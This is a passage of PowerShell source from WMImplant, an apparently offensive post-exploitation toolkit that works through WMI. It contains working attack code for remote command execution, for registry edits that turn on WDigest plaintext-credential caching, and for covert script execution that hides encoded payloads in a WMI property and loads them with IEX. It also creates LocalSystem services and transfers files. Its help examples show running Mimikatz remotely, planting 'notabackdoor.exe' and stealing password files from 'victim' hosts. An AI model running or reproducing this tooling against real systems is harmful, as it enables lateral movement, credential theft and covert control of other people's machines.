            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Computername $ComputerName
        }
    }

    end{}
}

function Invoke-RegValueMod
{
    # This function allows you to modify the registry on a remote system.  At the moment, it's
    # largely constrained to STRING type mods, although this is beginning to expand
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)] 
        [switch]$KeyCreate,
        [Parameter(Mandatory = $False)] 
        [switch]$KeyDelete,
        [Parameter(Mandatory = $False)] 
        [string]$RegHive,
        [Parameter(Mandatory = $False)] 
        [string]$RegKey,
        [Parameter(Mandatory = $False)] 
        [string]$RegSubKey,
        [Parameter(Mandatory = $False)] 
        [string]$RegValue
    )

    Process
    {
        $hklm = 2147483650
        $hkcu = 2147483649
        $hkcr = 2147483648
        $hkusers = 2147483651
        $hkcurrentconfig = 2147483653

        if(!$RegHive)
        {
            $RegHive = Read-Host "What hive would you like to modify? Ex: hklm >"
            $RegHive = $RegHive.Trim().ToLower()

            switch($RegHive.ToLower())
            {
                "hklm"
                {
                    $hivevalue = $hklm
                }

                "hkcu"
                {
                    $hivevalue = $hkcu
                }

                "hkcr"
                {
                    $hivevalue = $hkcr
                }

                "hkusers"
                {
                    $hivevalue = $hkusers
                }

                "hkcurrentconfig"
                {
                    $hivevalue = $hkcurrentconfig
                }

                default
                {
                    $hivevalue = $hkcu
                }
            }
        }
        else
        {
            switch($RegHive.ToLower())
            {
                "hklm"
                {
                    $hivevalue = $hklm
                }

                "hkcu"
                {
                    $hivevalue = $hkcu
                }

                "hkcr"
                {
                    $hivevalue = $hkcr
                }

                "hkusers"
                {
                    $hivevalue = $hkusers
                }

                "hkcurrentconfig"
                {
                    $hivevalue = $hkcurrentconfig
                }

                default
                {
                    $hivevalue = $hkcu
                }
            }
        }

        if(!$RegKey)
        {
            $RegKey = Read-Host "What's the registry key you'd like to modify? Ex: SOFTWARE\Microsoft\Windows >"
        }

        if(!$RegSubKey)
        {
            $RegSubKey = Read-Host "What's the registry Sub Key you'd like to modify? Ex: WMImplantInstalled >"
        }

        if ((!$KeyCreate) -and (!$KeyDelete))
        {
            $question = Read-Host "Do you want to [create] or [delete] a key? >"
            $question = $question.Trim().ToLower()

            if($question.ToLower() -eq "create")
            {
                $KeyCreate = $True
            }
            else
            {
                $KeyDelete = $True
            }
        }

        if($KeyCreate)
        {
            if(!$RegValue)
            {
                $RegValue = Read-Host "What's the data you'd like for the registry value being modified? >"
            }

            if($Credential)
            {
                if($RegSubKey -eq "UseLogonCredential" -or $RegSubKey -eq "AllowAutoConfig") 
                {
                    Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $ComputerName -Credential $Credential
                }
                else
                {
                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgmuentList $hivevalue, $RegKey, $RegValue, $RegSubKey -ComputerName $ComputerName -Credential $Credential
                }
            }

            else
            {
                if($RegSubKey -eq "UseLogonCredential" -or $RegSubKey -eq "AllowAutoConfig")
                {
                    Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $ComputerName
                }
                else
                {
                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList $hivevalue, $RegKey, $RegValue, $RegSubKey -ComputerName $ComputerName
                }
            }
        }

        elseif($KeyDelete)
        {
            if($Credential)
            {
                Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegSubKey -ComputerName $ComputerName -Credential $Credential
            }

            else
            {
                Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegSubKey -ComputerName $ComputerName
            }
        }
    }
    end{}
}

function Invoke-RemoteScriptWithOutput
{
    # This function will start a new PowerShell process on the targeted system, IEX load a user specified script,
    # run the user specified function, store the output, and retrieve the output
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)] 
        [string]$Location,
        [Parameter(Mandatory = $False)] 
        [string]$Function
    )

    Process
    {
        if(!$Location)
        {
            $Location = Read-Host "Please provide the full path to the local PowerShell script you'd like to run on the target >"
            $Location = $Location.Trim()
        }

        if(!$Function)
        {
            $Function = Read-Host "Please provide the PowerShell function you'd like to run >"
            $Function = $Function.Trim()
        }

        # Saving original WMI Property value
        if($Credential)
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential).DebugFilePath
        }
        else
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName).DebugFilePath
        }

        # Read in and store the script to run
        $script_to_run = Get-Content -Encoding byte -Path $Location
        $encoded_script = [Int[]][Char[]]$script_to_run -Join ','

        if($Credential)
        {
            $modify_wmi_prop = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
        }
        else
        {
            $modify_wmi_prop = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
        }
        $modify_wmi_prop.DebugFilePath = $encoded_script
        $null = $modify_wmi_prop.Put()

        Write-Verbose "Building PowerShell command"
        # Separating the commands out to make it a little easier to view/understand what is happening
        $remote_command = '$a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a = [char[]][int[]]$a.DebugFilePath.Split('','') -Join ''''; $a | .(-Join[char[]]@(105,101,120));'
        $remote_command += '$output = '
        $remote_command += "($Function | Out-String).Trim();"
        $remote_command += ' $EncodedText = [Int[]][Char[]]$output -Join '','';'
        $remote_command += ' $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()'

        Write-Verbose "Running command on remote system..."

        if($Credential)
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
        }
        else
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
        }

        # Poll remote system, and determine if the script is done
        # If not, sleep and poll again
        $quit = $false
        while($quit -eq $false)
        {
            Write-Verbose "Polling property to see if the script has completed"
            if($Credential)
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
            }
            else
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
            }
            
            try 
            {
                if($encoded_script -eq $modified_WMIObject.DebugFilePath)
                {
                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
                    Start-Sleep -s 5
                }
                else
                {
                    Write-Verbose "Script is complete, pulling data now"
                    $quit = $true
                }
            }
            catch
            {
                Write-Verbose "Script is not done, sleeping for 5 and trying again"
                Start-Sleep -s 5
            }
        }
    
        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
        # Print to console
        $decode

        # Replacing original WMI property value from remote system
        Write-Verbose "Replacing original WMI property value from remote system"
        $modified_WMIObject.DebugFilePath = $Original_WMIProperty
        $null = $modified_WMIObject.Put()

        Write-Verbose "Done!"
    }
}

function Invoke-ServiceMod
{
    # This script allows users to start, stop, create, and delete services on the targeted host
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)]
        [string]$Service,
        [Parameter(Mandatory = $False)] 
        [switch]$Start,
        [Parameter(Mandatory = $False)] 
        [switch]$Stop,
        [Parameter(Mandatory = $False)] 
        [switch]$Create,
        [Parameter(Mandatory = $False)] 
        [string]$NewServiceName,
        [Parameter(Mandatory = $False)] 
        [string]$NewServicePath,
        [Parameter(Mandatory = $False)] 
        [switch]$Delete
    )

    Process
    {
        if(!$Start -and !$Stop -and !$Delete -and !$Create)
        {
            $ServiceGoal = Read-Host "Do you want to [stop], [start], [delete], or [create] a service? >"
            $ServiceGoal = $ServiceGoal.Trim().ToLower()

            switch($ServiceGoal)
            {
                "start"
                {
                    $Start = $true
                }

                "stop"
                {
                    $Stop = $true
                }

                "delete"
                {
                    $Delete = $true
                }

                "create"
                {
                    $Create = $true
                }
            }
        }

        if ($Start -or $Stop -or $Delete)
        {
            if(!$Service)
            {
                $Service = Read-Host "What is the name of the service you are targeting? >"
                $Service = $Service.Trim()
            }

            $filter = "name='$Service'"

            if($Credential)
            {
                $SystemService = Get-WmiObject -class win32_service -ComputerName $ComputerName -Filter $filter -Credential $Credential
            }
            else
            {
                $SystemService = Get-WmiObject -class win32_service -ComputerName $ComputerName -Filter $filter
            }
            if($Start)
            {
                $SystemService.StartService()
            }
            elseif($Stop)
            {
                $SystemService.StopService()
            }
            elseif($Delete)
            {
                $SystemService.Delete()
            }
        }
        elseif($Create)
        {
            if(!$NewServiceName)
            {
                $NewServiceName = Read-Host "Please provide the name for the service you'd like to create. >"
                $NewServiceName = $NewServiceName.Trim()
            }

            if(!$NewServicePath)
            {
                $NewServicePath = Read-Host "Please provide the path to your new service binary. >"
                $NewServicePath = $NewServicePath.Trim()
            }

            $args = $false,$NewServiceName,0,$null,$null,$NewServiceName,$NewServicePath,$null,16,"Automatic","LocalSystem",$null
            
            if($Credential)
            {
                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $ComputerName -Credential $Credential
            }
            else
            {
                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $ComputerName
            }
        }
    }
    end{}
}

function Invoke-WMImplant
{
    <#
    .SYNOPSIS
    This function starts all of WMImplant and is designed to display the main menu.

    .DESCRIPTION
    This is the main WMImplant function.  When calling Invoke-WMImplant you will be presented with the main menu.

    .DESCRIPTION
    This parameter is used to start WMImplant in an interactive manner. This is done by default, unless specifying a command

    .PARAMETER RemoteUser
    Specify a username. Default is the current user context.  This user is used to connect to remote systems.

    .PARAMETER RemotePass
    Specify the password for the appropriate user. This is the password for the account used to connect to remote systems.

    .PARAMETER ListCommands
    List the available commands within WMImplant.

    .PARAMETER LocalFile
    This parameter is used when user's need to provide the path to a file locally for interaction (uploading a local file or providing a path to download a file to locally), or when saving event log information locally.

    .PARAMETER RemoteFile
    This parameter is used when user's need to provide the path to a file remotely for interaction (downloading a remote file or providing a path to upload a file to) or when needing to specify a directory (such as a directory where you want to list all its contents).
    
    .PARAMETER RemoteDirectory
    This parameter is used when specifying a directory for listing its contents

    .PARAMETER RemoteDrive
    This parameter is used when you need to specify a drive to search on a remote system.

    .PARAMETER RemoteCommand
    This parameter is used to specify a command to run on a remote system.

    .PARAMETER RemoteExtension
    This parameter is used when you need to specify a file extension to search for on a remove machine.

    .PARAMETER ComputerName
    This parameter specifies the system to execute the WMImplant command on.

    .PARAMETER Function
    This parameter specifies the function to run when remotely running PowerShell

    .PARAMETER ProcessName
    This parameter specifies the process name when killing a process by name.

    .PARAMETER ProcessID
    This parameter specifies the process ID to use when killing a process by ID.

    .PARAMETER ServiceStart
    This parameter specifies that a service will be started.

    .PARAMETER ServiceStop
    This parameter specifies that a service will be stopped.

    .PARAMETER ServiceCreate
    This parameter specifies that a service will be create.

    .PARAMETER ServiceDelete
    This parameter specifies that a service will be deleted.

    .PARAMETER ServiceName
    This parameter specifies the name of the service when one is being created.

    .PARAMETER RemoteID
    This parameter can be used to specify a Job ID for deletion.

    .PARAMETER Time
    This parameter can be used to specify the time (Ex: 15:35).

    .PARAMETER RegMethod
    This parameter specifies if you are creating or deleting a registry value.

    .PARAMETER RegHive
    This parameter specifies the registry hive you will use (between hklm and hkcu).

    .PARAMETER RegKey
    This parameter specifies the registry key that will be modified.

    .PARAMETER RegSubKey
    This parameter specifies the registry sub key that will be modified.

    .PARAMETER RegValue
    This parameter contains the data that's added to a registry value when it is created.

    .PARAMETER KeyCreate
    This parameter specifies that a registry key will be deleted.

    .PARAMETER KeyDelete
    This parameter specifies that a registry key will be created.

    .PARAMETER Cat
    This parameter specifies that WMImplant will read the contents of the specified file.

    .PARAMETER Copy
    This parameter specifies that WMImplant will copy a file from one location to another.

    .PARAMETER Download
    This parameter specifies that WMImplant will download a specified file.

    .PARAMETER Upload
    This parameter specifies that WMImplant will upload a specified file.

    .PARAMETER CommandExec
    This parameter specifies that WMImplant will run a command and return the output.

    .PARAMETER DisableWDigest
    This parameter specifies that WMImplant will remove the UseLogonCredential registry key from the targeted system.

    .PARAMETER DisableWinRM
    This parameter will have WMImplant attempt to force disable WinRM on the targeted system.

    .PARAMETER EnableWdigest
    This parameter will have WMImplant set the UseLogonCredential registry key on the targeted system

    .PARAMETER EnableWinRM
    This parameter will have WMImplant attempt to force enable WinRM on the targeted system.

    .PARAMETER RemotePosh
    This parameter will tell WMImplant to run a PowerShell command on the targeted system

    .PARAMETER SetWMIDefault
    This parameter sets the DebugFilePath property back to the default MS value.

    .PARAMETER PS
    This parameter specifies that WMImplant will perform a process listing on the targeted system

    .PARAMETER ProcessKill
    This parameter specifies that WMImplant will kill a process on the targeted system.

    .PARAMETER ProcessStart
    This parameter specifies that WMImplant will start a process on the targeted system.

    .PARAMETER ActiveUsers
    This parameter specifies that WMImplant will pull user accounts with active processes on the targeted system.

    .PARAMETER BasicInfo
    This parameter specifies that WMImplant will retrieve basic information about the targeted system.

    .PARAMETER DriveList
    This parameter specifies that WMImplant will pull a listing of drives from the targeted system.

    .PARAMETER IFConfig
    This parameter specifies that WMImplant will pull NICs with active connections on the targeted system.

    .PARAMETER InstalledPrograms
    This parameter directs WMImplant to retrieve a list of the programs installed on the targeted system.

    .PARAMETER VacantSystem
    This parameter directs WMImplant to try to determine if a user is active at the targeted system, or is they are afk.

    .PARAMETER LogonEvents
    This parameter directs WMImplant to pull a list of user accounts that log into the targeted system.

    .PARAMETER LogOff
    This paremeter directs WMImplant to log users off the targeted system.

    .PARAMETER Reboot
    This parameter directs WMImplant to reboot the targeted system.

    .PARAMETER PowerOff
    This parameter directs WMImplant to shut down the targeted system.

    .PARAMETER Location
    This parameter specifies the path to the PowerShell script you will run on the targeted system.

    .EXAMPLE
    > Invoke-WMImplant
    This will run the main menu and allow for easy interaction

    .EXAMPLE
    > Invoke-WMImplant -ListCommands
    This will list all available commands supported within WMImplant.

    .EXAMPLE
    > Invoke-WMImplant -Cat -RemoteUser Chris -RemotePass Pass123 -RemoteFile C:\Users\Chris\Desktop\secrets.txt -ComputerName windowspc
    This command uses the "cat" command, and attempts to read the secrets.txt file with the provided username and password on the windowspc system

    .EXAMPLE
    > Invoke-WMImplant -Cat -RemoteFile C:\Users\Chris\Desktop\pass.txt -ComputerName windowspc
    This command uses the "cat" command, and attempts to read the pass.txt file within the context of the current user on the windowspc system

    .EXAMPLE
    > Invoke-WMImplant -Upload -LocalFile C:\notavirus.exe -RemoteUser Chris -RemotePass pass123 -RemoteFile C:\Windows\TEMP\safe.exe -ComputerName securewindows
    This command uploads the C:\notavirus.exe file locally to the securewindows system at C:\Windows\TEMP\safe.exe and authenticates to the remote system with the Chris account and the target downloads it from local systme using the King account.

    .EXAMPLE
    > Invoke-WMImplant -Download -RemoteFile C:\passwords.txt -LocalFile C:\Users\Chris\Downloads\passwords.txt -ComputerName mysystem
    This command attempts to download the file C:\passwords.txt on the remote system "mysystem" locally to C:\Users\Chris\Downloads\passwords.txt.  It authenticates to the remote machine (to download the file) using the current user's context, and then is downloaded localy.
    
    .EXAMPLE
    > Invoke-WMImplant -LS -RemoteFile C:\Users\Chris\Downloads -ComputerName win7computer
    This command will get a directory list of all files within C:\Users\Chris\Downloads on the "win7computer" system under the current user's context.

    .EXAMPLE
    > Invoke-WMImplant -Search -RemoteFile password.txt -Drive C: -ComputerName chrispc -RemoteUser homedomain\Chris -RemotePass pass123
    This command searches the remote system "chrispc" for any file called password.txt on the C drive and authenticates using the credentials provided.

    .EXAMPLE
    > Invoke-WMImplant -Search -RemoteExtension sql -Drive C: -ComputerName computer2
    This command uses the current user's context to search the "computer2" system for any file on the C drive that has a "sql" file extension.

    .EXAMPLE
    > Invoke-WMImplant -Remote_Posh -Location C:\test.ps1 -Function Invoke-Mimikatz -ComputerName win7sys -RemoteUser test\admin -Pass admin123
    This command authenticates to the remote system using the provided admin account, downloads the test.ps1 script in memory and runs Invoke-Mimikatz, and returns the output to the local system over WMI.
    
    .EXAMPLE
    > Invoke-WMImplant -PS -RemoteUser test\apple -RemotePass pass123 -ComputerName hackerpc
    This command gets a process listing on the system "hackerpc" by authenticating as the apple user

    .EXAMPLE
    > Invoke-WMImplant -ProcessKill -ProcessID 1194 -ComputerName sys3
    This command kills process id 1194 on the "sys3" system and authenticates with the current user's context

    .EXAMPLE
    > Invoke-WMImplant -ProcessKill -ProcessName systemexplorer.exe -ComputerName win7 -RemoteUser internal\admin -RemotePass pass123
    This command kills the remote process "systemexplorer.exe" on the system "win7" and authenticates as the "admin" user.

    .EXAMPLE
    > Invoke-WMImplant -ProcessStart -RemoteFile notepad.exe -ComputerName victimsys
    This command authenticates to the "victimsys" system under the current user's context and starts the process notepad.exe

    .EXAMPLE
    > Invoke-WMImplant -ProcessStart -RemoteFile C:\notabackdoor.exe -ComputerName victim2 -RemoteUser inside\goodadmin -RemotePass pass222
    This command authenticates to the "victim2" system as the user "goodadmin" and runs the binary located at C:\notabackdoor.exe
    
    .EXAMPLE
    > Invoke-WMImplant -ActiveUsers -ComputerName winadmin
    This command displays any user that has a process running on the "winadmin" system via the current user's context

    .EXAMPLE
    > Invoke-WMImplant -VacantSystem -ComputerName victim9 -RemoteUser owned\chris -RemotePass badpass
    This command attempts to determine if a user is active at the "victim9" system by searching for active screensavers and a logon prompt and authenticates as the user "chris"
    
    .EXAMPLE
    > Invoke-WMImplant -DriveList -ComputerName victim101
    This command authenticates to the victim101 system in the context of the current user and lists all drives connected to the system

    .EXAMPLE
    > Invoke-WMImplant -Reboot -ComputerName victom3
    This command reboots the "victom3" system

    .EXAMPLE
    > Invoke-WMImplant -PowerOff -ComputerName victim9 -RemoteUser domain\user -RemotePass pass123
    This command powers off the "victim9" and authenticates as the provided user and password.
    
    .EXAMPLE
    > Invoke-WMImplant -KeyCreate -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest -RegValue "True" -ComputerName win7user -RemoteUser test\chris -RemotePass pass123
    This command authenticates to the win7user system using the provided credentials and creates the ChrisTest value located at HKLM:\SOFTWARE\Microsoft\Windows\DWM

    .EXAMPLE
    > Invoke-WMImplant -KeyDelete -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest2 -ComputerName Win7user4
    This command authenticates as the current user to the win7user4 system and delete's the ChrisTest2 value located at HKLM:\SOFTWARE\Microsoft\Windows\DWM
    #>

    [CmdletBinding(DefaultParameterSetName="Interactive")]

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False, ParameterSetName='Interactive')]
        [switch]$Interactive,
        [Parameter(Mandatory = $False, ParameterSetName='List Commands')]
        [switch]$ListCommands,
        [Parameter(Mandatory = $False)]
        [string]$RemoteUser,
        [Parameter(Mandatory = $False)]
        [string]$RemotePass,
        [Parameter(Mandatory = $False, ParameterSetName='Download File')]
        [Parameter(ParameterSetName='Upload File')]
        [Parameter(ParameterSetName='Logon Events')]
        [Parameter(ParameterSetName='Copy File')]
        [Parameter(ParameterSetName='Delete File')]
        [string]$LocalFile,
        [Parameter(Mandatory = $False, ParameterSetName='Read File')]
        [Parameter(ParameterSetName='Upload File')]
        [Parameter(ParameterSetName='Download File')]
        [Parameter(ParameterSetName='File Search Name')]
        [Parameter(ParameterSetName='Process Start')]
        [Parameter(ParameterSetName='Copy File')]
        [string]$RemoteFile,
        [Parameter(ParameterSetName='Directory Listing')]
        [string]$RemoteDirectory,
        [Parameter(Mandatory = $False, ParameterSetName='File Search Name')]
        [Parameter(ParameterSetName='File Search Extension')]
        [string]$RemoteDrive,
        [Parameter(Mandatory = $False, ParameterSetName='File Search Extension')]
        [string]$RemoteExtension,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)]
        [Alias("Target")]
        [string]$ComputerName,
        [Parameter(Mandatory = $False, ParameterSetName='Remote PowerShell')]
        [string]$Function,
        [Parameter(Mandatory = $False, ParameterSetName='Process Kill Name')]
        [string]$ProcessName,
        [Parameter(Mandatory = $False, ParameterSetName='Process Kill ID')]
        [int]$ProcessID,
        [Parameter(Mandatory = $False, ParameterSetName='Service Start')]
        [Parameter(ParameterSetName='Service Stop')]
        [Parameter(ParameterSetName='Service Create')]
        [Parameter(ParameterSetName='Service Delete')]
        [string]$ServiceName,
        [Parameter(Mandatory = $False, ParameterSetName='Service Start')]
        [switch]$ServiceStart,
        [Parameter(Mandatory = $False, ParameterSetName='Service Stop')]
        [switch]$ServiceStop,
        [Parameter(Mandatory = $False, ParameterSetName='Service Create')]
        [switch]$ServiceCreate,
        [Parameter(Mandatory = $False, ParameterSetName='Service Delete')]
        [switch]$ServiceDelete,
        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
        [Parameter(ParameterSetName='Delete Reg Key')]
        [string]$RegKey,
        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
        [Parameter(ParameterSetName='Delete Reg Key')]
        [string]$RegSubKey,
        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
        [string]$RegValue,
        [Parameter(Mandatory = $False, ParameterSetName='Command Execution')] 
        [string]$RemoteCommand,
        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
        [switch]$KeyCreate,
        [Parameter(Mandatory = $False, ParameterSetName='Delete Reg Key')]
        [switch]$KeyDelete,
        [Parameter(Mandatory = $False, ParameterSetName='Read File')]
        [switch]$Cat,
        [Parameter(Mandatory = $False, ParameterSetName='Copy File')]
        [switch]$Copy,
        [Parameter(Mandatory = $False, ParameterSetName='Delete File')]
        [switch]$Delete,
        [Parameter(Mandatory = $False, ParameterSetName='Download File')]
        [switch]$Download,
        [Parameter(Mandatory = $False, ParameterSetName='Directory Listing')]
        [switch]$LS,
        [Parameter(Mandatory = $False, ParameterSetName='File Search Name')]
        [Parameter(Mandatory = $False, ParameterSetName='File Search Extension')]
        [switch]$Search,
        [Parameter(Mandatory = $False, ParameterSetName='Upload File')]
        [switch]$Upload,
        [Parameter(Mandatory = $False, ParameterSetName='Command Execution')]
        [switch]$CommandExec,
        [Parameter(Mandatory = $False, ParameterSetName='Disable WDigest')]
        [switch]$DisableWdigest,
        [Parameter(Mandatory = $False, ParameterSetName='Disable WinRM')]
        [switch]$DisableWinRM,
        [Parameter(Mandatory = $False, ParameterSetName='Enable WDigest')]
        [switch]$EnableWdigest,
        [Parameter(Mandatory = $False, ParameterSetName='Enable WinRM')]
        [switch]$EnableWinRM,
        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
        [Parameter(ParameterSetName='Delete Reg Key')]
        [ValidateSet("hklm","hkcu","hkcr","hkusers","hkcurrentconfig")]
        [string]$RegHive,
        [Parameter(Mandatory = $False, ParameterSetName='Remote PowerShell')]
        [switch]$RemotePosh,
        [Parameter(Mandatory = $False, ParameterSetName='Set Default WMI Property')]
        [switch]$SetWMIDefault,
        [Parameter(Mandatory = $False, ParameterSetName='Process Listing')]
        [switch]$PS,
        [Parameter(Mandatory = $False, ParameterSetName='Process Kill Name')]
        [Parameter(ParameterSetName='Process Kill ID')]
        [switch]$ProcessKill,
        [Parameter(Mandatory = $False, ParameterSetName='Process Start')]
        [switch]$ProcessStart,
        [Parameter(Mandatory = $False, ParameterSetName='List Active Users')]
        [switch]$ActiveUsers,
        [Parameter(Mandatory = $False, ParameterSetName='List Basic Info')]
        [switch]$BasicInfo,
        [Parameter(Mandatory = $False, ParameterSetName='Drive Listing')]
        [switch]$DriveList,
        [Parameter(Mandatory = $False, ParameterSetName='Active NIC Listing')]
        [switch]$IFConfig,
        [Parameter(Mandatory = $False, ParameterSetName='List Installed Programs')]
        [switch]$InstalledPrograms,
        [Parameter(Mandatory = $False, ParameterSetName='Identify Vacant System')]
        [switch]$VacantSystem,
        [Parameter(Mandatory = $False, ParameterSetName='Logon Events')]
        [switch]$LogonEvents,
        [Parameter(Mandatory = $False, ParameterSetName='Logoff Users')]
        [switch]$LogOff,
        [Parameter(Mandatory = $False, ParameterSetName='Reboot System')]
        [switch]$Reboot,
        [Parameter(Mandatory = $False, ParameterSetName='Remote PowerShell')]
        [string]$Location,
        [Parameter(Mandatory = $False, ParameterSetName='Power Off System')]
        [switch]$PowerOff
    )

    Process
    {
        # Create the remote credential object that will be needed for EVERYTHING
        if($RemoteUser -and $RemotePass)
        {
            $RemotePassword = ConvertTo-SecureString $RemotePass -asplaintext -force 
            $RemoteCredential = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $RemoteUser,$RemotePassword
        }

        if((!$ComputerName) -and ($PSCmdlet.ParameterSetName -ne 'Interactive'))
        {
            Throw "You need to specify a target to run the command against!"
        }

        if($Cat)
        {
            if(!$RemoteFile)
            {
                Throw "You need to specify a file to read with the RemoteFile flag!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Get-FileContentsWMImplant -Credential $RemoteCredential -ComputerName $Computer -File $RemoteFile
                }

                else
                {
                    Get-FileContentsWMImplant -ComputerName $Computer -File $RemoteFile
                }
            }
        }

        elseif($Copy)
        {
            if(!$LocalFile)
            {
                Throw "You need to specify the file you want to copy with the LocalFile flag!"
            }
            
            if(!$RemoteFile)
            {
                Throw "You need to specify where the file should be copied to with the RemoteFile flag!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Edit-FileWMI -Credential $RemoteCredential -ComputerName $Computer -Copy -FileLocation $LocalFile -CopyLocation $RemoteFile
                }

                else
                {
                    Edit-FileWMI -Copy -ComputerName $Computer -FileLocation $LocalFile -CopyLocation $RemoteFile
                }
            }
        }

        elseif($Delete)
        {
            if(!$LocalFile)
            {
                Throw "You need to specify the file you want to delete with the LocalFile flag!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Edit-FileWMI -Credential $RemoteCredential -ComputerName $Computer -Delete -FileLocation $LocalFile
                }

                else
                {
                    Edit-FileWMI -ComputerName $Computer -Delete -FileLocation $LocalFile
                }
            }
        }

        elseif($Download)
        {
            if(!$RemoteFile)
            {
                Throw "You need to specify a file to read with the RemoteFile flag!"
            }

            if(!$LocalFile)
            {
                Throw "You need to specify the location to save the file with the $LocalFile flag!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-FileTransferWMImplant -Credential $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -ComputerName $Computer
                }

                else
                {
                    Invoke-FileTransferWMImplant -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -ComputerName $Computer
                }
            }
        }

        elseif($LS)
        {
            if(!$RemoteDirectory)
            {
                Throw "Please provide the RemoteDirectory parameter to specify the directory to list!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-LSWMImplant -Credential $RemoteCredential -ComputerName $Computer -Directory $RemoteDirectory
                }

                else
                {
                    Invoke-LSWMImplant -ComputerName $Computer -Directory $RemoteDirectory
                }
            }
        }

        elseif($Search)
        {
            if(!$RemoteFile -and !$RemoteExtension)
            {
                Throw "Please provide the RemoteFile or RemoteExtension parameter to specify the file or extension to search for!"
            }

            if(!$RemoteDrive)
            {
                Throw "Please provide the RemoteDrive parameter to specify the drive to search!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    if($RemoteFile)
                    {
                        Find-FileWMImplant -Credential $RemoteCredential -File $RemoteFile -ComputerName $Computer -Drive $RemoteDrive
                    }
                    elseif($RemoteExtension)
                    {
                        Find-FileWMImplant -Credential $RemoteCredential -Extension $RemoteExtension -ComputerName $Computer -Drive $RemoteDrive
                    }
                }

                else
                {
                    if($RemoteFile)
                    {
                        Find-FileWMImplant -File $RemoteFile -ComputerName $Computer -Drive $RemoteDrive
                    }
                    elseif($RemoteExtension)
                    {
                        Find-FileWMImplant -Extension $RemoteExtension -ComputerName $Computer -Drive $RemoteDrive
                    }
                }
            }
        }

        elseif($Upload)
        {
            if(!$LocalFile)
            {
                Throw "Please use the LocalFile flag to specify the file to upload!"
            }

            if(!$RemoteFile)
            {
                Throw "Please use the RemoteFile flag to specify the full path to upload the file to!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-FileTransferWMImplant -Credential $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -ComputerName $Computer
                }

                else
                {
                    Invoke-FileTransferWMImplant -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -ComputerName $Computer
                }
            }
        }

        elseif($CommandExec)
        {
            if(!$RemoteCommand)
            {
                Throw "You need to specify the command to run with the -Command!"
            }

            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-CommandExecution -Credential $RemoteCredential -ExecCommand $RemoteCommand -ComputerName $Computer
                }

                else
                {
                    Invoke-CommandExecution -ComputerName $Computer -ExecCommand $RemoteCommand
                }
            }
        }

        elseif($DisableWDigest)
        {
            Foreach($Computer in $ComputerName)
            {
                if($RemoteCredential)
                {
                    Invoke-RegValueMod -Credential $RemoteCredential -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -ComputerName $Computer
                }

                else
                {
